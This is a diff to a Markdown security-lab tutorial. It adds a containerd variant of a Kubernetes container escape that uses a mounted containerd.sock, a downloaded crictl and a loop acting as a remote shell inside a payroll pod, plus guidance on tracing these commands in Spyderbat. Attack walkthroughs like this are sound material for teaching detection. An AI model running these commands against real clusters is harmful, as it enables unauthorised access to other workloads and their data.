@@ -97,11 +97,11 @@ kubectl exec -it -n falco falco-mbk2n -- /bin/bash
 One method for container escape uses the host's docker socket to start a new vulnerable container. Let's check if there is a Docker socket available:
 
 ```sh
-find / -name docker.sock 2>/dev/null
+find / -name docker.sock -o -name containerd.sock 2>/dev/null
 ```
-```
-/host/var/run/docker.sock
-```
+
+<details>
+    <summary>If <code>docker.sock</code> exists</summary>
 
 Interesting. This means we can start a container that can perform a chroot, although we have to install docker first:
 
@@ -152,7 +152,66 @@ Let's exec into the `payroll-calculator` container and see if we can get some in
 docker exec -it k8s_payroll-calculator_payroll-calculator-684c6b68cf-ndx9z_payroll-prod_5c5953d1-caaf-4cc6-b97f-83191cd82ebb_0 bash
 ```
 
-Looking around, we see the source code and a configuration file:
+</details>
+
+<details>
+    <summary>If only <code>containerd.sock</code> exists</summary>
+
+Since the docker socket isn't available, we are stuck with containterd. This won't stop us, but it requires a bit more work. We'll follow the steps in [this exploit](https://kubehound.io/reference/attacks/EXPLOIT_CONTAINERD_SOCK/), with some slight modifications, to install and use crictl to escape to the host.
+
+We can use curl to download the CRI Tools release:
+
+```sh
+curl -LO https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.31.1/crictl-v1.31.1-linux-amd64.tar.gz
+```
+```sh
+tar Cxzvf /tmp crictl-v1.31.1-linux-amd64.tar.gz
+```
+
+Next, we can configure `crictl`, using the containerd socket we found:
+
+```sh
+MOUNTED_SOCK_PATH=/host/run/containerd/containerd.sock 
+echo "runtime-endpoint: unix://${MOUNTED_SOCK_PATH}
+image-endpoint: unix://${MOUNTED_SOCK_PATH}
+debug: false" > /tmp/crictl.yaml && alias cc='/tmp/crictl --config /tmp/crictl.yaml'
+```
+
+We can test that this is working by listing the active containers:
+
+```sh
+cc ps
+```
+```
+CONTAINER           IMAGE               CREATED             STATE               NAME                        ATTEMPT             POD ID              POD
+4ca28124cd0ed       2a13fa9b780dd       6 days ago          Running             payroll-calculator          0                   a8f78eb944f43       payroll-calculator-f75c55976-zxtl2
+c1eca6706ae61       543980b7d80b4       6 days ago          Running             payrolldb                   0                   f2ca656f7c0ea       payrolldb-67949bf447-rt9l6
+c114b02096985       de2b2423537f2       6 days ago          Running             spyderbat-nanoagent         0                   768548bae9a1b       spyderbat-nanoagent-fmgmt
+d237c06e8bd1f       de2b2423537f2       6 days ago          Running             clustermonitor              0                   a33c201ed39f6       clustermonitor-deployment-5f77767c-8gnrw
+7ac51ee1ee4c4       259ef03e23666       6 days ago          Running             bobdev-container            0                   02d8d5ecbffea       bobdev
+a2849de9f7e87       1530a9e265445       6 days ago          Running             falcoctl-artifact-follow    0                   270b2616deebd       falco-2j98w
+17580fb4ac0ca       d61916ceea362       6 days ago          Running             falco                       0                   270b2616deebd       falco-2j98w
+8b514b3d76414       e3197d6b0c4c7       6 days ago          Running             falcosidekick               0                   a76562efc48a3       falco-falcosidekick-7795b684f-7bpqk
+...
+```
+
+With `crictl`, we are unable to start a new container, since Kubernetes would remove it due to it being unrecognized. However, we can still run commands on other pods. Let's try running some commands in the `payroll-calc` pod, starting by getting its container ID:
+
+```sh
+CTR=$(cc ps -a | grep 'payroll-calculator' | awk '{print $1}')
+```
+
+Next, we can rig up a fake "terminal" by using a while loop:
+
+```sh
+while true; do echo -n "$ "; read -r CMD || break; cc exec -sit $CTR bash -c "$CMD"; done; echo
+```
+
+### Exploitation
+
+</details>
+
+Looking around on the payroll container, we see the source code and a configuration file:
 
 ```sh
 ls -la
@@ -234,6 +293,12 @@ Now that we have completed the attack, let's look at what the Spyderbat trace lo
 
 In a real environment, we would likely investigate these one at a time and eventually discover that they are all linked by checking the commands that are run. In this case, however, we know they are all from the same activity, so we can select several of the traces and start a process investigation. To make sure we get everything, expand the groups and select Spydertraces with one in each namespace: build, Falco, no namespace, and payroll-prod. You may need to scroll to the side to see the namespace column.
 
+> **Note**
+> 
+> If you followed the instructions for an environment without docker, your investigation will look a bit different. In particular, the traces in the payroll pod might not show up as a Spydertrace, due to how the processes were run. However, all of the `crictl` commands should show up in the Falco pod. To see the processes in the payroll pod, try using search to add in the extra context.
+>
+> Select one of the `crictl` processes, and find one with the container ID listed in its command (e.g. `/tmp/crictl --config /tmp/crictl.yaml exec -sit 4ca28124cd0ed bash -c ps -aux`). Copy that ID, navigate to the search page, and search for containers with a container ID that starts with the copied ID (`container_id ~= "4ca28124cd0ed*"`). Then select these, and click "Add to existing investigation".
+
 ![An example of the initial graph](./initial_graph.png)
 
 As shown in the example above, the initial graph has quite a bit of information present. To make better sense of it, let's clean up the graph a bit. To start, take a look at the largest tree:
@@ -242,7 +307,7 @@ As shown in the example above, the initial graph has quite a bit of information 
 
 This shows bash running `curl`, `sh`, and many other child processes beneath `sh`. In those children, we can see `dpkg` and `apt-get`; both are package installers. With that information, we can assume that this tree represents the docker install script we ran. Since we already know what this tree is, let's minimize it. Right-click the `sh` process and select "Remove X Descendants".
 
-This is much more manageable now, but there are still some processes missing since they were not included in the traces. To make sure we are not missing anything, right-click the root processes of each container (the first colored process within the container "box") and select "Add X Children" or "Add X Descendant Connections". If the graph gets too large again, just right-click the point you want to prune and remove what isn't needed. Another tip is to remove the IP down at the bottom with port 53. This is the DNS service and doesn't seem to be relevant here. The final step is to right-click on the top-level shim processes and move them left or right to reorder the graph to make it more readable. To make this step easier, try enabling "Show Relative Time" in the options at the top of the graph (I have it enabled in the screenshots above).
+This is much more manageable now, but some processes are still missing since they were not included in the traces. To make sure we are not missing anything, right-click the root processes of each container (the first colored process within the container "box") and select "Add X Children" or "Add X Descendant Connections". If the graph gets too large again, just right-click the point you want to prune and remove what isn't needed. Another tip is to remove the IP down at the bottom with port 53. This is the DNS service and doesn't seem to be relevant here. The final step is to right-click on the top-level shim processes and move them left or right to reorder the graph to make it more readable. To make this step easier, try enabling "Show Relative Time" in the options at the top of the graph (I have it enabled in the screenshots above).
 
 ![An example of a cleaner graph, showing just the root actions taken by the attacker](./clean_graph.png)
 
